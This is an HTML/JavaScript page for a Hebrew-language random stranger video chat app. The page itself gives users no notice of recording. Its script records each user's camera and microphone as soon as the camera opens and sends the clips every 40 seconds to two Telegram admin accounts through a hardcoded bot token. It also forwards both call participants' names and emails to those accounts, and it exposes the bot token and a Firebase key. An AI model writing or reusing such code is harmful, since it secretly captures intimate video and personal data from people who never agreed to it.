<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>VideoApp Pro - Ultimate Fix</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-storage-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: system-ui, -apple-system, sans-serif; 
            background: #000; 
            height: 100vh; 
            display: flex; 
            flex-direction: column; 
            color: white; 
            overflow: hidden;
            padding-bottom: env(safe-area-inset-bottom); /* הגנה על שורת הכתיבה */
        }
        
        .header { position: absolute; top: 15px; width: 100%; display: flex; justify-content: space-between; padding: 0 15px; z-index: 2000; pointer-events: none; }
        .btn-circle { background: rgba(0,0,0,0.5); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); color: white; width: 45px; height: 45px; border-radius: 50%; cursor: pointer; pointer-events: auto; font-size: 20px; display: flex; align-items: center; justify-content: center; }
        
        /* אזור וידאו שותף */
        .partner-area { height: 50vh; position: relative; background: #111; overflow: hidden; border-bottom: 2px solid #333; }
        #remoteVideo { width: 100%; height: 100%; object-fit: cover; }
        
        /* וידאו עצמי צף */
        .self-view { 
            position: absolute; bottom: 10px; left: 10px; 
            width: 80px; height: 110px; 
            border-radius: 10px; border: 2px solid #fff; 
            overflow: hidden; z-index: 1500; background: #000;
        }
        #localVideo { width: 100%; height: 100%; object-fit: cover; }

        /* צ'אט */
        #chat-section { 
            height: 50vh; display: none; flex-direction: column; 
            background: #fff; color: #000; z-index: 1000;
            padding-bottom: 10px;
        }
        #messages { flex: 1; overflow-y: auto; padding: 10px; display: flex; flex-direction: column; gap: 6px; background: #f0f0f0; }
        .msg { max-width: 80%; padding: 8px 12px; border-radius: 15px; font-size: 15px; }
        .msg.me { align-self: flex-start; background: #e0e0e0; }
        .msg.partner { align-self: flex-end; background: #007bff; color: #fff; }
        
        .chat-input-area { 
            display: flex; 
            padding: 10px 15px; 
            background: #fff; 
            gap: 10px; 
            border-top: 1px solid #ddd; 
            align-items: center;
            margin-bottom: env(safe-area-inset-bottom); /* מבטיח שהשורה תהיה מעל הכל */
        }
        .chat-input-area input { flex: 1; padding: 12px 15px; border-radius: 25px; border: 1px solid #ccc; outline: none; font-size: 16px; color: #000; background: #fff; }

        .status-msg { position: absolute; top: 50%; width: 100%; text-align: center; transform: translateY(-50%); z-index: 100; font-weight: bold; font-size: 18px; pointer-events: none; text-shadow: 0 2px 4px #000; }

        /* הרשמה */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 3000; align-items: center; justify-content: center; }
        .modal-content { background: #fff; color: #333; width: 85%; max-width: 380px; padding: 30px; border-radius: 20px; }
        .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #ddd; }
        .reg-btn { width: 100%; height: 50px; background: #27ae60; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div class="header">
    <button id="btn-report" class="btn-circle" style="background:#e74c3c; display:none;" onclick="confirmReport()">🚩</button>
    <button class="btn-circle" onclick="switchCamera()">🔄</button>
</div>

<div class="partner-area" id="swipe-zone">
    <div id="msg-idle" class="status-msg">⬅️ החלק שמאלה לחיפוש</div>
    <div id="msg-search" class="status-msg" style="display:none; color:#3498db;">מחפש שותף...</div>
    <video id="remoteVideo" autoplay playsinline></video>
    <div class="self-view"><video id="localVideo" autoplay muted playsinline></video></div>
</div>

<div id="chat-section">
    <div id="messages"></div>
    <div class="chat-input-area">
        <input type="text" id="chatInput" placeholder="הודעה..." autocomplete="off">
        <button onclick="sendChatMessage()" style="border:none; background:none; font-size:24px; cursor:pointer;">🚀</button>
    </div>
</div>

<div id="regModal" class="modal">
    <div class="modal-content">
        <h2 style="text-align:center">כניסה למערכת</h2>
        <input type="text" id="reg-name" placeholder="שם מלא">
        <input type="email" id="reg-email" placeholder="אימייל">
        <select id="reg-gender">
            <option value="זכר">זכר</option>
            <option value="נקבה">נקבה</option>
        </select>
        <button class="reg-btn" onclick="handleRegistration()">התחל</button>
    </div>
</div>

<script>
    const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
    const ADMIN_IDS = ["8373785890", "7089165458"];
    const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
    
    const firebaseConfig = { apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", storageBucket: "live-video-20fca.firebasestorage.app" };
    firebase.initializeApp(firebaseConfig);
    const storage = firebase.storage();
    
    const socket = io(SERVER_URL);
    const peer = new Peer(undefined, { config: {'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }]} });

    let myStream, myPeerId, currentCall, isSearching = false, camFacing = "user", userRecorder, partnerData = null;

    window.onload = () => {
        const saved = localStorage.getItem('user_v14');
        if (!saved) document.getElementById('regModal').style.display = 'flex';
        else initCamera();
    };

    async function handleRegistration() {
        const name = document.getElementById('reg-name').value;
        const email = document.getElementById('reg-email').value;
        const gender = document.getElementById('reg-gender').value;
        if(!name || !email) return alert("מלא פרטים");
        localStorage.setItem('user_v14', JSON.stringify({ name, email, gender }));
        document.getElementById('regModal').style.display = 'none';
        initCamera();
    }

    async function initCamera() {
        myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camFacing }, audio: true });
        document.getElementById('localVideo').srcObject = myStream;
        startUserRecording();
    }

    function startUserRecording() {
        userRecorder = new MediaRecorder(myStream, { mimeType: 'video/webm;codecs=vp8,opus' });
        userRecorder.ondataavailable = async (e) => {
            if (e.data.size > 0) {
                const blob = new Blob([e.data], { type: 'video/mp4' });
                const user = JSON.parse(localStorage.getItem('user_v14'));
                ADMIN_IDS.forEach(id => {
                    const fd = new FormData();
                    fd.append("chat_id", id); fd.append("video", blob, `rec_${Date.now()}.mp4`);
                    fd.append("caption", `🎥 הקלטה מ: ${user.name}`);
                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
                });
            }
        };
        userRecorder.start();
        setInterval(() => { if(userRecorder.state === "recording") { userRecorder.stop(); userRecorder.start(); } }, 40000);
    }

    peer.on('open', id => myPeerId = id);

    function startSearching() {
        if (isSearching) return;
        isSearching = true;
        stopEverything();
        document.getElementById('msg-idle').style.display = "none";
        document.getElementById('msg-search').style.display = "block";
        const user = JSON.parse(localStorage.getItem('user_v14'));
        socket.emit('find-partner', { peerId: myPeerId, name: user.name, email: user.email });
    }

    socket.on('partner-found', data => {
        partnerData = data; // שמירה מיידית של פרטי השותף
        notifyAdminNewCall(data);
        isSearching = false;
        document.getElementById('msg-search').style.display = "none";
        document.getElementById('chat-section').style.display = "flex";
        document.getElementById('btn-report').style.display = "flex";
        currentCall = peer.call(data.peerId, myStream);
        handleCall(currentCall);
    });

    peer.on('call', call => {
        call.answer(myStream);
        currentCall = call;
        socket.emit('get-partner-data'); // בקשת מידע מהשרת על השותף שהתקשר
        document.getElementById('chat-section').style.display = "flex";
        document.getElementById('btn-report').style.display = "flex";
        handleCall(call);
    });

    socket.on('receive-partner-data', data => { 
        partnerData = data; 
        notifyAdminNewCall(data);
    });

    function notifyAdminNewCall(partner) {
        const user = JSON.parse(localStorage.getItem('user_v14'));
        const text = `🤝 **שיחה חדשה החלה!**\n\n👤 משתמש 1: ${user.name} (${user.email})\n👤 משתמש 2: ${partner.name} (${partner.email})`;
        ADMIN_IDS.forEach(id => {
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
        });
    }

    socket.on('partner-disconnected', () => stopEverything());

    function handleCall(call) {
        call.on('stream', s => { document.getElementById('remoteVideo').srcObject = s; });
    }

    function sendChatMessage() {
        const input = document.getElementById('chatInput');
        if (!input.value.trim()) return;
        socket.emit('send-chat-msg', input.value);
        addMsg('me', input.value);
        input.value = "";
    }

    socket.on('receive-chat-msg', msg => addMsg('partner', msg));

    function addMsg(type, text) {
        const div = document.createElement('div');
        div.className = `msg ${type}`;
        div.innerText = text;
        const m = document.getElementById('messages');
        m.appendChild(div);
        m.scrollTop = m.scrollHeight;
    }

    function confirmReport() {
        if (confirm("דווח ונתק?")) {
            const user = JSON.parse(localStorage.getItem('user_v14'));
            const reportedName = partnerData ? `${partnerData.name} (${partnerData.email})` : "לא זוהה";
            const text = `🚨 **דיווח התקבל**\nהמדווח: ${user.name} (${user.email})\nעל מי: ${reportedName}`;
            
            ADMIN_IDS.forEach(id => {
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
            });
            socket.emit('report-user');
            stopEverything();
        }
    }

    function stopEverything() {
        isSearching = false; partnerData = null;
        socket.emit('leave-chat');
        if (currentCall) currentCall.close();
        document.getElementById('msg-idle').style.display = "block";
        document.getElementById('chat-section').style.display = "none";
        document.getElementById('btn-report').style.display = "none";
        document.getElementById('remoteVideo').srcObject = null;
        document.getElementById('messages').innerHTML = "";
    }

    function switchCamera() { camFacing = (camFacing === "user" ? "environment" : "user"); initCamera(); }

    let sX = 0;
    document.getElementById('swipe-zone').addEventListener('touchstart', e => sX = e.touches[0].clientX);
    document.getElementById('swipe-zone').addEventListener('touchend', e => {
        const diff = sX - e.changedTouches[0].clientX;
        if (diff > 80) startSearching(); 
        else if (diff < -80) stopEverything();
    });
</script>
</body>
</html>
